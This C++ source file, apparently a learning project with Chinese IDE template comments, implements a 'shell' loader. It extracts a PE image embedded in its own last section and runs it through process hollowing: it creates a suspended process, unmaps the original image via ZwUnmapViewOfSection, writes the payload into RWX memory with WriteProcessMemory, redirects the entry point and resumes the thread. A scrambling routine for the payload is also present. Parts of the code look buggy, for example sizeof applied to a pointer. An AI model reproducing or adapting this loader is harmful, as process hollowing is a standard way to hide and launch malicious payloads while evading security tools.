// SHELL.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>




//coding method:,0-13,1-8,2-9,3-14,4-15,5-11,6-10,7-12,
void Co_DeCoding1(unsigned char* File_ptr, long FileSize) {
    unsigned char coding_buffer[8];
    for (long i = 0; i < FileSize / 16; i++) {
        for (char j = 0; j < 8; j++) {
            coding_buffer[j] = File_ptr[i * 16 + j];
        }
        File_ptr[i * 16 + 0] = File_ptr[i * 16 + 13];
        File_ptr[i * 16 + 1] = File_ptr[i * 16 + 8];
        File_ptr[i * 16 + 2] = File_ptr[i * 16 + 9];
        File_ptr[i * 16 + 3] = File_ptr[i * 16 + 14];
        File_ptr[i * 16 + 4] = File_ptr[i * 16 + 15];
        File_ptr[i * 16 + 5] = File_ptr[i * 16 + 11];
        File_ptr[i * 16 + 6] = File_ptr[i * 16 + 10];
        File_ptr[i * 16 + 7] = File_ptr[i * 16 + 12];
        File_ptr[i * 16 + 13] = coding_buffer[0];
        File_ptr[i * 16 + 8] = coding_buffer[1];
        File_ptr[i * 16 + 9] = coding_buffer[2];
        File_ptr[i * 16 + 14] = coding_buffer[3];
        File_ptr[i * 16 + 15] = coding_buffer[4];
        File_ptr[i * 16 + 11] = coding_buffer[5];
        File_ptr[i * 16 + 10] = coding_buffer[6];
        File_ptr[i * 16 + 12] = coding_buffer[7];
    }
}



char* LoadingFile(TCHAR *szBuffer) {
    
    HMODULE hModuleNt = LoadLibrary(TEXT("ntdll.dll"));
    typedef DWORD(WINAPI* _TZwUnmapViewOfSection)(HANDLE, PVOID);
    _TZwUnmapViewOfSection pZwUnmapViewOfSection = (_TZwUnmapViewOfSection)GetProcAddress(hModuleNt, "ZwUnmapViewOfSection");


    char FilePath[MAX_PATH];
    wcstombs(FilePath, szBuffer, wcslen(szBuffer) + 1);

    FILE *FileSrc = fopen(FilePath, "rb");
    if (FileSrc == NULL) {
        MessageBox(0, 0, 0, 0);
        fclose(FileSrc);
        exit(0);
    }



    fseek(FileSrc, 0, 2);
    long length = (ftell(FileSrc) / 16 + 1) * 16;
    fseek(FileSrc, 0, 0);
    char* SrcMemory;
    SrcMemory = (char*)malloc(length);
    if (SrcMemory == NULL) {
        MessageBox(0, 0, 0, 0);
        free(SrcMemory);
        exit(0);
    }
    memset(SrcMemory, 0, length);
    fread(SrcMemory, 1, length, FileSrc);
    fclose(FileSrc);
    _IMAGE_DOS_HEADER* Dos_header = (_IMAGE_DOS_HEADER*)SrcMemory;
    int unsigned NT = Dos_header->e_lfanew;
    _IMAGE_FILE_HEADER* FIle_header = (_IMAGE_FILE_HEADER*)(SrcMemory + NT + 0x04);
    _IMAGE_OPTIONAL_HEADER64* Optional_header = (_IMAGE_OPTIONAL_HEADER64*)(SrcMemory + NT + 0x18);
    char* ptr_of_lists = SrcMemory + NT + 0x18 + FIle_header->SizeOfOptionalHeader;
    _IMAGE_SECTION_HEADER* LastSection = (_IMAGE_SECTION_HEADER*)((FIle_header->NumberOfSections - 1)*0x28 + ptr_of_lists);
//    Co_DeCoding1((unsigned char*)LastSection->PointerToRawData, LastSection->SizeOfRawData);

    char* DecodeFile_ptr = SrcMemory + LastSection->PointerToRawData;
    Dos_header = (_IMAGE_DOS_HEADER*)DecodeFile_ptr;
    NT = Dos_header->e_lfanew;
    FIle_header = (_IMAGE_FILE_HEADER*)(DecodeFile_ptr + NT + 0x04);
    Optional_header = (_IMAGE_OPTIONAL_HEADER64*)(DecodeFile_ptr + NT + 0x18);
    ptr_of_lists = (char*)DecodeFile_ptr + NT + 0x18 + FIle_header->SizeOfOptionalHeader;

    char* NewFile = (char*)malloc(Optional_header->SizeOfImage);
    if (NewFile == NULL)
    {
        MessageBox(0, 0, 0, 0);
        exit(0);
    }
    memset(NewFile, 0, sizeof(NewFile));
    memcpy(NewFile, DecodeFile_ptr, Optional_header->SizeOfHeaders);

    _IMAGE_SECTION_HEADER *TheSection;
    for (size_t i = 0; i < FIle_header->NumberOfSections; i++)
    {
        TheSection = (_IMAGE_SECTION_HEADER*)(ptr_of_lists + i * 0x28);
        memcpy(NewFile + TheSection->VirtualAddress, DecodeFile_ptr + TheSection->PointerToRawData, TheSection->SizeOfRawData);
    }
    free(SrcMemory);



    STARTUPINFO ie_si = { 0 };
    PROCESS_INFORMATION ie_pi;
    ie_si.cb = sizeof(ie_si);
					

    CreateProcess(
        NULL,                    // name of executable module					
        szBuffer,                // command line string					
        NULL, 					 // SD
        NULL,  		             // SD			
        FALSE,                   // handle inheritance option					
        CREATE_SUSPENDED,     	 // creation flags  				
        NULL,                    // new environment block					
        NULL,                    // current directory name					
        &ie_si,                  // startup information					
        &ie_pi                   // process information					
    );


    WOW64_CONTEXT contx;
    contx.ContextFlags = CONTEXT_FULL;


    Wow64GetThreadContext(ie_pi.hThread, &contx);

    
    pZwUnmapViewOfSection(ie_pi.hProcess, GetModuleHandle(NULL));
    LPVOID NewImageBase = VirtualAllocEx(ie_pi.hProcess, (LPVOID)Optional_header->ImageBase, Optional_header->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    //jian cha kan kan

    WriteProcessMemory(ie_pi.hProcess, (LPVOID)NewImageBase, NewFile, sizeof(NewFile),NULL);

    //jian cha kan kan




    //EIP						
    contx.Eax = Optional_header->ImageBase + Optional_header->AddressOfEntryPoint;

    //ImageBase						
    char* baseAddress = (CHAR*)contx.Ebx + 8;
    
    WriteProcessMemory(ie_pi.hProcess, baseAddress, &(Optional_header->ImageBase), 8, NULL);

    ResumeThread(ie_pi.hThread);

    return NewFile;
}





int main()
{
    TCHAR FilePath[MAX_PATH];
    GetModuleFileName(NULL, FilePath, MAX_PATH);
    char * NewFile = LoadingFile(FilePath);
    return 1;
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
